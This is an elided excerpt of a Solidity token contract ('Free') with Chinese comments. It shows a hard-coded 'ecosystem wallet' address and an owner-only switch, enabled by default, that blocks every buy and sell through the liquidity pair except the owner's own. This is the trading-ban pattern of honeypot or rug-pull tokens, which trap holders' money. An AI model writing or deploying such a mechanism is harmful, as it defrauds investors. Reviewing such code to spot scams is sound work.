...
contract Free is ERC20Detailed, Ownable {
    ...
    //卖出生态钱包
    address public marketAddress = 0x8270F765C9fa4AeA2141FAdc60249225196d7Bd9;
    ...
    //禁止交易开关
    bool public swapDisEnable = true;
    //lp质押总额
    ...
    //推荐人数
    mapping(address => uint256)public commondAmount;
    //lp分红地址组
    ...
    function _transferFrom(
        ...
        if(swapDisEnable){
            if(sender == pair || recipient == pair){
                require(sender == owner() || recipient == owner(), "no swap");
            }
        }
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        if (sender == pair){
    ...
    //设置🈲️交易开关 true开启，禁止交易 false关闭，可以交易
    function setSwapDisEnable(bool _target) external onlyOwner{
        swapDisEnable = _target;
    }
    ...
    //查询推荐人数量
    function getRecommendAmount(address _address) view external returns(uint256){
        return commondAmount[_address];
    }
